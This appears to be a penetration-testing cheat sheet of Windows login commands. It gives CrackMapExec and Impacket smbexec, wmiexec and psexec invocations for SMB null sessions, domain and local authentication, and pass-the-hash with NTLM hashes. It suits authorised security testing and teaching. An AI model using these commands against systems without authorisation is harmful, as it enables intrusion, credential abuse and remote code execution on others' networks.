# Login

## SMB null session login

```
cme smb <target> -u '' -p ''
```

## SMB anonymous login

```
cme smb <target> -u 'a' -p ''
```

## SMB authentication (domain) - CME

```
cme smb <target> -u <user> -p <password> -d <domain>
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## SMB authentication (domain) - Impacket

```
smbexec.py <domain>/<username>:<password>@<target>
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## SMB authentication (local)

```
cme smb <target> -u <user> -p <password> --local-auth
```

## SMB authentication (Pass-The-Hash)

```
cme smb <target> -u <user> -H <hash> --local-auth
```

## WMI Authentication (domain)

```
wmiexec.py <domain>/<user>:<password>@<target>
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## WMI Authentication (Pass-The-Hash)

```
wmiexec.py -hashes <hash> <user>@<target>
```

## Powershell Authentication (domain)

```
psexec.py <domain>/<user>:<password>@<target>
```

## Powershell Authentication (Pass-The-Hash)

```
psexec.py -hashes <hash> <user>@<target>
```

